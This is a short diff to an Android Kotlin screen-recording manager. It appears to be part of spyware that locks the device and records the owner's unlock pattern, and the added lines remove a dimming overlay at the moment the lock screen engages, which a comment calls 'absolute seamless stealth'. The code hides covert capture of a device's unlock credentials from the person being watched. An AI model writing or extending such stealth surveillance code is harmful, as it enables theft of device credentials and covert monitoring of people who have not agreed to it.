@@ -118,6 +118,13 @@ object ScreenRecordManager {
                         dpm.lockNow()
                         DebugLogger.log("CAPTURE_PATTERN", "Device locked. Awaiting user unlock...")
                     }
+                    
+                    // Unblind exactly as the lock screen engages for absolute seamless stealth
+                    withContext(Dispatchers.Main) {
+                        DimmerManager.removeOverlay(ctx)
+                        DebugLogger.log("CAPTURE_PATTERN", "Blindfold lifted. Lock screen is now visible.")
+                    }
+                    
                     delay(600_000L) // 10 minutes absolute fallback limit
                 } else {
                     delay(pendingDur * 1000L)
